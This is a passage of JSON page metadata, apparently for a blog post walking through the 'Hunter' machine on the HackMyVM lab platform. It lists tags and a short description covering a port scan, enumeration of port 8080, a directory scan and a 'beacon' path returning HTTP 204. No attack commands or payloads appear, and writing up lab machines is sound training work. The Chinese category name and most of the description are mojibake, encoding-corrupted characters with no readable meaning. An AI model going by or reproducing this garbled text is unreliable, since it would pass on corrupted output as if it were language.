Hunter","date":"2025-11-21","updated":"2025-11-21","tags":["HackMyVM","Linux","rkhunter"],"categories":"é¶æœº","comments":true,"description":"Hunter https://hackmyvm.eu/machines/machine.php?vm=Hunter Recon PortScan æšä¸¾ 8080 ç«¯å£ ç›®å½•æ‰«æ beacon è¿”å›ä»£ç  204ï¼šæ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£..."}},"__N_SSG":true}